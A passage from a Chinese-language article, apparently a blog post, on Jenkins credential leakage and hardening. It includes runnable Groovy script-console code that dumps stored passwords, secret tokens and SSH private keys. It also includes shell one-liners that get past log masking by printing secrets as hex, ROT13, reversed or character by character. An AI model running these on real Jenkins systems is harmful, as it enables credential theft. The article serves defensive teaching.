+<p>此脚本以明文输出所有用户名/密码凭证：</p>
+<pre class="language-none"><code class="language-none">ID: database-credentials
+Username: dbadmin
+Password: SuperSecret123!
+---
+ID: api-credentials
+Username: apiuser
+Password: ApiKey789!
+---</code></pre>
+<h3 id="机密文本提取">机密文本提取</h3>
+<p>机密文本凭证同样容易受到攻击：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">import</span> com<span class="token punctuation">.</span>cloudbees<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>*
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>jenkinsci<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>plaincredentials<span class="token punctuation">.</span>*
+
+<span class="token keyword">def</span> secrets <span class="token operator">=</span> CredentialsProvider<span class="token punctuation">.</span><span class="token function">lookupCredentials</span><span class="token punctuation">(</span>
+    StringCredentials<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
+    Jenkins<span class="token punctuation">.</span>instance<span class="token punctuation">,</span>
+    null<span class="token punctuation">,</span>
+    null
+<span class="token punctuation">)</span>
+
+secrets<span class="token punctuation">.</span>each <span class="token punctuation">{</span> s <span class="token operator">-&gt;</span>
+    println <span class="token interpolation-string"><span class="token string">"ID: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">s<span class="token punctuation">.</span>id</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"Secret: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">s<span class="token punctuation">.</span>secret</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"---"</span></span>
+<span class="token punctuation">}</span></code></pre>
+<p>输出：</p>
+<pre class="language-none"><code class="language-none">ID: aws-secret-key
+Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+---
+ID: slack-webhook
+Secret: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX
+---</code></pre>
+<h3 id="SSH-密钥提取">SSH 密钥提取</h3>
+<p>甚至 SSH 私钥也可以被提取：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">import</span> com<span class="token punctuation">.</span>cloudbees<span class="token punctuation">.</span>jenkins<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>sshcredentials<span class="token punctuation">.</span>*
+
+<span class="token keyword">def</span> sshCreds <span class="token operator">=</span> CredentialsProvider<span class="token punctuation">.</span><span class="token function">lookupCredentials</span><span class="token punctuation">(</span>
+    SSHUserPrivateKey<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
+    Jenkins<span class="token punctuation">.</span>instance<span class="token punctuation">,</span>
+    null<span class="token punctuation">,</span>
+    null
+<span class="token punctuation">)</span>
+
+sshCreds<span class="token punctuation">.</span>each <span class="token punctuation">{</span> c <span class="token operator">-&gt;</span>
+    println <span class="token interpolation-string"><span class="token string">"ID: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">c<span class="token punctuation">.</span>id</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"Username: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">c<span class="token punctuation">.</span>username</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+    println <span class="token interpolation-string"><span class="token string">"Private Key:"</span></span>
+    println c<span class="token punctuation">.</span>privateKey
+    println <span class="token interpolation-string"><span class="token string">"---"</span></span>
+<span class="token punctuation">}</span></code></pre>
+<p>这会以 PEM 格式输出完整的私钥，可直接用于未经授权的访问。</p>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 脚本控制台风险</p><div class="admonition-content"><p><strong>访问控制问题</strong></p>
+<ul>
+<li>需要「Overall/RunScripts」权限</li>
+<li>通常授予资深开发人员和 DevOps</li>
+<li>基本 Jenkins 中没有脚本执行的审计轨迹</li>
+<li>脚本以完整的 Jenkins 权限执行</li>
+</ul>
+<p><strong>检测挑战</strong></p>
+<ul>
+<li>没有内置的脚本控制台使用日志记录</li>
+<li>难以检测凭证提取</li>
+<li>没有可疑脚本执行的警报</li>
+<li>需要额外的插件来建立审计轨迹</li>
+</ul>
+<p><strong>缓解复杂性</strong></p>
+<ul>
+<li>无法在不失去功能的情况下禁用脚本控制台</li>
+<li>限制访问可能影响合法管理</li>
+<li>需要信任所有具有脚本访问权限的用户</li>
+<li>考虑使用 Script Security 插件进行限制</li>
+</ul>
+</div></div>
+<h2 id="API-泄露：程序化访问">API 泄露：程序化访问</h2>
+<p>Jenkins 提供广泛的 REST 和 CLI API，可能会通过各种端点无意中暴露凭证。</p>
+<h3 id="任务配置-XML">任务配置 XML</h3>
+<p>可以通过 API 检索任务配置，可能会暴露嵌入在 XML 中的凭证：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检索任务配置</span>
+<span class="token function">curl</span> <span class="token parameter variable">-u</span> admin:token https://jenkins.example.com/job/my-pipeline/config.xml</code></pre>
+<p>如果凭证在任务配置中硬编码（这是不良做法但令人惊讶地常见）：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>builders</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hudson.tasks.Shell</span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">&gt;</span></span>
+        mysql -h db.example.com -u dbuser -pHardcodedPassword123! -e "SELECT * FROM users"
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>command</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hudson.tasks.Shell</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>builders</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span></code></pre>
+<p>密码在 XML 响应中以明文暴露。</p>
+<h3 id="构建-Artifact-和测试报告">构建 Artifact 和测试报告</h3>
+<p>凭证可能通过归档的 artifact 和测试报告泄漏：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Build'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token function">withCredentials</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">string</span><span class="token punctuation">(</span>
+                    credentialsId<span class="token punctuation">:</span> <span class="token string">'api-key'</span><span class="token punctuation">,</span>
+                    variable<span class="token punctuation">:</span> <span class="token string">'API_KEY'</span>
+                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment">// 将凭证写入配置文件</span>
+                    sh <span class="token string">'echo "api_key: $API_KEY" &gt; config.yaml'</span>
+                    
+                    <span class="token comment">// 归档文件 - 凭证现在在 artifact 中！</span>
+                    archiveArtifacts artifacts<span class="token punctuation">:</span> <span class="token string">'config.yaml'</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Test'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token comment">// 测试报告包含环境变量</span>
+                sh <span class="token string">'pytest --verbose --capture=no'</span>
+                
+                <span class="token comment">// JUnit 报告可能在输出中包含凭证</span>
+                junit <span class="token string">'test-results/*.xml'</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 Artifact 和报告泄露</p><div class="admonition-content"><p><strong>归档的 Artifact</strong></p>
+<ul>
+<li>嵌入凭证的配置文件</li>
+<li>包含机密的构建输出</li>
+<li>可通过 Web UI 和 API 访问</li>
+<li>除非清理，否则无限期保留</li>
+<li>开发人员下载用于调试</li>
+</ul>
+<p><strong>测试报告</strong></p>
+<ul>
+<li>JUnit XML 报告可能捕获 stdout/stderr</li>
+<li>测试失败通常包含环境上下文</li>
+<li>带有详细输出的 HTML 报告</li>
+<li>所有具有任务读取权限的用户都可访问</li>
+</ul>
+</div></div>
+<h3 id="构建参数和环境变量">构建参数和环境变量</h3>
+<p>API 端点暴露构建参数和环境变量：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取包含参数的构建信息</span>
+<span class="token function">curl</span> <span class="token parameter variable">-u</span> admin:token https://jenkins.example.com/job/my-pipeline/1/api/json?tree<span class="token operator">=</span>actions<span class="token punctuation">[</span>parameters<span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>
+<p>如果凭证作为参数传递，响应可能包含凭证值：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"actions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+    <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"DB_PASSWORD"</span><span class="token punctuation">,</span>
+      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"SuperSecret123!"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">]</span>
+  <span class="token punctuation">}</span><span class="token punctuation">]</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="凭证插件-API">凭证插件 API</h3>
+<p>某些凭证插件暴露可能泄漏信息的 API：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 列出所有凭证（某些插件允许这样做）</span>
+<span class="token function">curl</span> <span class="token parameter variable">-u</span> admin:token https://jenkins.example.com/credentials/api/json</code></pre>
+<p>虽然正确配置的插件会掩码凭证值，但配置错误或插件漏洞可能会暴露它们。</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ API 泄露向量</p><div class="admonition-content"><p><strong>配置导出</strong></p>
+<ul>
+<li>任务配置可能包含嵌入的机密</li>
+<li>存储在 Jenkins 中的流水线定义（而非 SCM）</li>
+<li>带有 API 密钥的插件配置</li>
+<li>带有系统凭证的全局配置</li>
+</ul>
+<p><strong>构建 Artifact 和报告</strong></p>
+<ul>
+<li>归档的 artifact 中的凭证</li>
+<li>带有机密的配置文件</li>
+<li>带有凭证输出的测试报告</li>
+<li>归档为 artifact 的日志文件</li>
+<li>可通过 artifact API 端点访问</li>
+</ul>
+<p><strong>插件漏洞</strong></p>
+<ul>
+<li>插件可能通过自定义 API 暴露凭证</li>
+<li>凭证处理中的安全漏洞</li>
+<li>插件端点上的访问控制不足</li>
+<li>具有已知问题的过时插件</li>
+</ul>
+</div></div>
+<h2 id="插件生态系统：第三方风险">插件生态系统：第三方风险</h2>
+<p>Jenkins 广泛的插件生态系统通过插件特定的漏洞和配置错误引入了额外的凭证泄露风险。</p>
+<h3 id="Credential-Binding-插件问题">Credential Binding 插件问题</h3>
+<p>Credential Binding 插件虽然设计用于安全地暴露凭证，但可能被滥用：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Deploy'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token function">withCredentials</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">string</span><span class="token punctuation">(</span>
+                    credentialsId<span class="token punctuation">:</span> <span class="token string">'api-key'</span><span class="token punctuation">,</span>
+                    variable<span class="token punctuation">:</span> <span class="token string">'API_KEY'</span>
+                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment">// 将凭证写入文件会暴露它</span>
+                    sh <span class="token string">'echo $API_KEY &gt; /tmp/api-key.txt'</span>
+                    
+                    <span class="token comment">// 文件在构建后仍保留在代理上</span>
+                    sh <span class="token string">'curl -H "Authorization: Bearer $API_KEY" https://api.example.com'</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>凭证被写入一个在代理上持久存在的文件，其他任务或具有代理访问权限的用户可以访问。</p>
+<h3 id="Mask-Passwords-插件：军备竞赛">Mask Passwords 插件：军备竞赛</h3>
+<p>现代 Jenkins 插件（如 Mask Passwords 和 Credentials Binding）试图检测并掩码构建日志中的凭证，甚至处理 base64 编码的值。然而，人类的创造力始终能击败自动检测：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    options <span class="token punctuation">{</span>
+        <span class="token function">maskPasswords</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    environment <span class="token punctuation">{</span>
+        PASSWORD <span class="token operator">=</span> <span class="token function">credentials</span><span class="token punctuation">(</span><span class="token string">'my-password'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Test'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token comment">// 在日志中被掩码：****</span>
+                sh <span class="token string">'echo $PASSWORD'</span>
+                
+                <span class="token comment">// 现代插件可以检测并掩码这个</span>
+                sh <span class="token string">'echo $PASSWORD | base64'</span>
+                
+                <span class="token comment">// 但人类的创造力找到了绕过的方法：</span>
+                
+                <span class="token comment">// 逐字符打印</span>
+                sh <span class="token string">'for i in $(seq 0 ${#PASSWORD}); do echo -n "${PASSWORD:$i:1}"; done'</span>
+                
+                <span class="token comment">// 十六进制编码</span>
+                sh <span class="token string">'echo $PASSWORD | xxd -p'</span>
+                
+                <span class="token comment">// ROT13 或简单密码</span>
+                sh <span class="token string">'echo $PASSWORD | tr "A-Za-z" "N-ZA-Mn-za-m"'</span>
+                
+                <span class="token comment">// 反转字符串</span>
+                sh <span class="token string">'echo $PASSWORD | rev'</span>
+                
+                <span class="token comment">// URL 编码</span>
+                sh <span class="token string">'python3 -c "import urllib.parse; print(urllib.parse.quote(\"$PASSWORD\"))"'</span>
+                
+                <span class="token comment">// 分割和串接</span>
+                sh <span class="token string">'P1=${PASSWORD:0:5}; P2=${PASSWORD:5}; echo "Part1: $P1, Part2: $P2"'</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 检测军备竞赛</p><div class="admonition-content"><p><strong>插件能力</strong></p>
+<ul>
+<li>现代插件检测精确的凭证匹配</li>
+<li>可以识别 base64 编码的凭证</li>
+<li>常见编码方案的模式匹配</li>
+<li>持续更新新的检测模式</li>
+</ul>
+<p><strong>人类创造力总是获胜</strong></p>
+<ul>
+<li>无限种转换字符串的方法</li>
+<li>自定义编码方案</li>
+<li>字符操作和分割</li>
+<li>通过多重转换进行混淆</li>
+<li>插件无法预测所有可能的转换</li>
+</ul>
+<p><strong>根本问题</strong></p>
+<ul>
+<li>检测是被动的，创造力是主动的</li>
+<li>每种新的检测方法都会产生新的绕过技术</li>
+<li>不能仅依赖自动掩码</li>
+<li>通过安全设计进行预防至关重要</li>
+<li>教育和代码审查仍然很关键</li>
+</ul>
+</div></div>
+<p>检测插件和绕过技术之间的军备竞赛说明了一个基本事实：你不能依赖自动掩码来保护凭证。唯一可靠的方法是从一开始就不要将凭证暴露在构建日志中。</p>
+<h3 id="Git-插件凭证泄漏">Git 插件凭证泄漏</h3>
+<p>Git 操作可能以各种方式暴露凭证：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Checkout'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token comment">// 凭证嵌入在 URL 中</span>
+                git url<span class="token punctuation">:</span> <span class="token string">'https://user:password@github.com/org/repo.git'</span>
+                
+                <span class="token comment">// 出现在构建日志和 git 配置中</span>
+                <span class="token comment">// 存储在代理上的 .git/config 中</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>凭证出现在：</p>
+<ul>
+<li>检出期间的构建日志</li>
+<li>代理上的 <code>.git/config</code> 文件</li>
+<li>Git reflog 和历史记录</li>
+<li>git 操作期间的进程列表</li>
+</ul>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 插件相关风险</p><div class="admonition-content"><p><strong>插件漏洞</strong></p>
+<ul>
+<li>插件可能有凭证处理错误</li>
+<li>安全补丁并不总是及时应用</li>
+<li>某些插件不安全地存储凭证</li>
+<li>自定义插件可能缺乏安全审查</li>
+</ul>
+<p><strong>配置复杂性</strong></p>
+<ul>
+<li>每个插件都有独特的凭证处理方式</li>
+<li>容易引入配置错误</li>
+<li>文档可能不完整</li>
+<li>安全最佳实践并不总是清楚</li>
+</ul>
+<p><strong>更新挑战</strong></p>
+<ul>
+<li>插件更新可能破坏现有任务</li>
+<li>由于兼容性问题，安全更新延迟</li>
+<li>漏洞披露可能滞后于发现</li>
+<li>没有插件的自动安全扫描</li>
+</ul>
+</div></div>
+<h2 id="常见泄露情境">常见泄露情境</h2>
+<p>理解凭证通常如何被暴露，有助于组织识别并防止自己的 Jenkins 部署中的类似漏洞。</p>
+<h3 id="公开可访问的-Jenkins-实例">公开可访问的 Jenkins 实例</h3>
+<p>未经适当身份验证就暴露在互联网上的 Jenkins 实例代表着关键漏洞：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 公开暴露风险</p><div class="admonition-content"><p><strong>常见配置错误</strong></p>
+<ul>
+<li>从未配置默认安全设置</li>
+<li>用于测试的「快速设置」留在生产环境中</li>
+<li>防火墙规则配置错误或被绕过</li>
+<li>脚本控制台无需身份验证即可访问</li>
+</ul>
+<p><strong>潜在影响</strong></p>
+<ul>
+<li>所有凭证都可通过脚本控制台提取</li>
+<li>云端供应商凭证使资源劫持成为可能</li>
+<li>数据库凭证暴露客户数据</li>
+<li>源代码仓库访问被入侵</li>
+<li>可能完全入侵基础设施</li>
+</ul>
+<p><strong>预防措施</strong></p>
+<ul>
+<li>永远不要将 Jenkins 直接暴露在互联网上</li>
+<li>要求所有访问都需要身份验证</li>
+<li>使用 VPN 或堡垒主机进行远程访问</li>
+<li>定期进行安全配置审计</li>
+<li>监控未经授权的访问尝试</li>
+</ul>
+</div></div>
+<h3 id="长期构建日志泄露">长期构建日志泄露</h3>
+<p>在构建输出中记录的凭证可能会长期暴露：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 构建日志风险</p><div class="admonition-content"><p><strong>如何发生</strong></p>
+<ul>
+<li>为调试启用详细日志记录</li>
+<li>调试语句从未从流水线中移除</li>
+<li>所有开发人员都可访问日志</li>
+<li>日志包含在备份和日志聚合系统中</li>
+<li>没有自动凭证扫描</li>
+</ul>
+<p><strong>泄露持续时间</strong></p>
+<ul>
+<li>凭证可能暴露数月或数年</li>
+<li>难以确定是否被未经授权的方访问</li>
+<li>需要大量的凭证轮换</li>
+<li>可能需要完整的安全审计</li>
+</ul>
+<p><strong>缓解措施</strong></p>
+<ul>
+<li>定期对 CI/CD 流水线进行安全审计</li>
+<li>自动扫描日志中的凭证</li>
+<li>考虑安全性的构建日志保留策略</li>
+<li>日志访问的最小权限原则</li>
+<li>定期审查流水线代码以防凭证泄露</li>
+</ul>
+</div></div>
+<h3 id="插件漏洞">插件漏洞</h3>
+<p>Jenkins 插件中的安全漏洞可能通过各种向量暴露凭证：</p>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 插件安全风险</p><div class="admonition-content"><p><strong>常见漏洞模式</strong></p>
+<ul>
+<li>未经身份验证的 API 端点暴露凭证</li>
+<li>凭证检索的访问控制不足</li>
+<li>插件数据中的不安全凭证存储</li>
+<li>通过错误消息泄漏信息</li>
+</ul>
+<p><strong>组织挑战</strong></p>
+<ul>
+<li>插件更新可能破坏现有任务</li>
+<li>由于兼容性测试，安全补丁延迟</li>
+<li>组织不知道正在使用的易受攻击插件</li>
+<li>没有插件的自动漏洞扫描</li>
+</ul>
+<p><strong>最佳实践</strong></p>
+<ul>
+<li>维护已安装插件的清单</li>
+<li>订阅 Jenkins 安全公告</li>
+<li>实施快速补丁流程</li>
+<li>在选择标准中考虑插件安全性</li>
+<li>定期对 Jenkins 实例进行漏洞扫描</li>
+</ul>
+</div></div>
+<h2 id="真实事件-当编码的凭证并不安全">真实事件:当编码的凭证并不安全</h2>
+<p>当你在生产环境中发现凭证泄露时,理论就变成了现实。我亲身经历过这种情况,当时一位同事将他的凭证存储在 Jenkins 中,以为系统的编码会保护它们。</p>
+<p>Jenkins 任务执行成功,但构建日志包含了他的编码凭证——任何有权访问日志的人都能看到。编码提供了一种虚假的安全感;base64 和类似方案都是可以轻易逆转的。对于未经训练的眼睛来说,它看起来像是随机字符串,但实际上是他的用户名和密码,只需一个解码命令就能还原成明文。</p>
+<p>当我发现泄露时,我的同事正在休假。这些凭证在多个系统中拥有广泛的访问权限,使情况变得危急。我不能等他回来——每一小时都会增加未经授权访问的风险。</p>
+<p>我立即向他的主管报告。这次对话虽然不舒服但很必要:「你的团队成员的凭证在 Jenkins 日志中被暴露了。它们需要立即轮换。」他的主管理解严重性并迅速采取行动,锁定账户并启动密码重置。安全团队审查了访问日志,以查找泄露期间的任何可疑活动。</p>
+<p>这次事件突显了几个痛苦的真相:</p>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚨 真实泄露的教训</p><div class="admonition-content"><p><strong>编码不是加密</strong></p>
+<ul>
+<li>Base64、十六进制和 URL 编码都是可逆转换</li>
+<li>任何有权访问日志的人都可以解码凭证</li>
+<li>Jenkins 凭证掩码无法捕获所有编码方案</li>
+<li>开发人员经常误解两者的区别</li>
+</ul>
+<p><strong>泄露在发现后仍持续存在</strong></p>
+<ul>
+<li>日志在凭证轮换后仍可访问</li>
+<li>不知道谁在泄露期间访问了日志</li>
+<li>备份和日志聚合系统保留副本</li>
+<li>通常无法重建完整的审计轨迹</li>
+</ul>
+<p><strong>组织影响</strong></p>
+<ul>
+<li>紧急响应中断正常运作</li>
+<li>对受影响个人的信任影响</li>
+<li>需要对所有流水线进行更广泛的安全审查</li>
+</ul>
+<p><strong>访问权限放大风险</strong></p>
+<ul>
+<li>具有广泛权限的凭证会产生更大的爆炸半径</li>
+<li>单一泄露可能危及多个系统</li>
+<li>最小权限原则变得至关重要</li>
+<li>服务账户需要与用户账户相同的保护</li>
+</ul>
+</div></div>
+<p>这次事件迫使我们对 Jenkins 安全实践进行全面审查。我们实施了自动凭证扫描,根据凭证敏感性限制日志访问,并进行安全培训,强调编码不提供安全性。最重要的是,我们建立了明确的未来事件升级程序——无论谁受到影响或他们是否在场,都不应该犹豫报告凭证泄露。</p>
+<p>当发现暴露的凭证时,立即采取行动。</p>
+<h2 id="保护-Jenkins-凭证">保护 Jenkins 凭证</h2>
+<p>防止凭证泄露需要跨 Jenkins 配置、流水线设计和操作实践的多层防御。</p>
+<h3 id="安全流水线实践">安全流水线实践</h3>
+<p>设计流水线以最小化凭证泄露：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy">pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Deploy'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token function">withCredentials</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">usernamePassword</span><span class="token punctuation">(</span>
+                    credentialsId<span class="token punctuation">:</span> <span class="token string">'api-credentials'</span><span class="token punctuation">,</span>
+                    usernameVariable<span class="token punctuation">:</span> <span class="token string">'API_USER'</span><span class="token punctuation">,</span>
+                    passwordVariable<span class="token punctuation">:</span> <span class="token string">'API_PASS'</span>
+                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment">// 使用凭证而不回显</span>
+                    sh <span class="token string">'''
+                        # 禁用命令回显
+                        set +x
+                        
+                        # 在命令中使用凭证
+                        curl -s -u "$API_USER:$API_PASS" https://api.example.com/deploy
+                        
+                        # 为后续命令重新启用回显
+                        set -x
+                    '''</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>关键实践：</p>
+<ul>
+<li>使用 <code>set +x</code> 在使用凭证时禁用命令回显</li>
+<li>避免打印环境变量</li>
+<li>使用 <code>withCredentials</code> 块限制凭证范围</li>
+<li>永远不要将凭证写入文件</li>
+</ul>
+<h3 id="凭证范围限制">凭证范围限制</h3>
+<p>使用文件夹范围的凭证限制凭证可用性：</p>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 凭证范围最佳实践</p><div class="admonition-content"><p><strong>使用 Folder 插件</strong></p>
+<ul>
+<li>按团队或项目将任务组织到文件夹中</li>
+<li>创建限定于特定文件夹的凭证</li>
+<li>防止其他文件夹中的任务访问凭证</li>
+<li>减少被入侵任务的爆炸半径</li>
+</ul>
+<p><strong>最小权限原则</strong></p>
+<ul>
+<li>为每个用例创建单独的凭证</li>
+<li>避免跨多个任务重复使用凭证</li>
+<li>尽可能使用只读凭证</li>
+<li>定期轮换凭证</li>
+</ul>
+<p><strong>凭证命名</strong></p>
+<ul>
+<li>使用指示范围和目的的描述性 ID</li>
+<li>避免使用「password」或「api-key」等通用名称</li>
+<li>在名称中包含环境（prod-db-password vs dev-db-password）</li>
+<li>记录凭证目的和授权使用</li>
+</ul>
+</div></div>
+<h3 id="访问控制和审计">访问控制和审计</h3>
+<p>实施严格的访问控制和监控：</p>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🔒 访问控制措施</p><div class="admonition-content"><p><strong>基于角色的访问控制</strong></p>
+<ul>
+<li>使用 Role Strategy 或 Folder Authorization 插件</li>
+<li>将凭证管理与任务执行权限分离</li>
+<li>限制脚本控制台访问给最少的用户</li>
+<li>定期审查用户权限</li>
+</ul>
+<p><strong>审计日志记录</strong></p>
+<ul>
+<li>启用 Audit Trail 插件进行凭证访问日志记录</li>
+<li>监控脚本控制台使用情况</li>
+<li>对正常模式之外的凭证检索发出警报</li>
+<li>将 Jenkins 日志与 SIEM 系统集成</li>
+</ul>
+<p><strong>构建日志安全</strong></p>
+<ul>
+<li>限制构建日志保留期限</li>
+<li>根据凭证敏感性限制日志访问（见下方注意事项）</li>
+<li>实施自动扫描日志中的凭证</li>
+<li>考虑对敏感流水线进行日志加密</li>
+</ul>
+<p><strong>构建日志访问注意事项</strong></p>
+<ul>
+<li>任务拥有者通常不拥有任务中使用的凭证</li>
+<li>生产凭证通常由安全团队拥有</li>
+<li>具有日志访问权限的任务拥有者可以查看暴露的凭证</li>
+<li>解决方案：限制日志访问给凭证拥有者，而非任务拥有者</li>
+<li>替代方案：自动凭证掩码（不完美，见前面章节）</li>
+<li>最佳方法：完全防止日志中的凭证泄露</li>
+</ul>
+</div></div>
+<h3 id="分离凭证管理与任务执行">分离凭证管理与任务执行</h3>
+<p>一个关键的安全实践是将谁可以管理凭证与谁可以在任务中使用它们分开。这种分离防止开发人员查看凭证值，同时仍允许他们在流水线中使用凭证。</p>
+<h4 id="没有分离的问题">没有分离的问题</h4>
+<p>默认情况下，Jenkins 通常授予广泛的权限：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token comment">// 没有适当分离，具有任务配置访问权限的开发人员可以：</span>
+pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Extract Credentials'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                <span class="token function">withCredentials</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">string</span><span class="token punctuation">(</span>
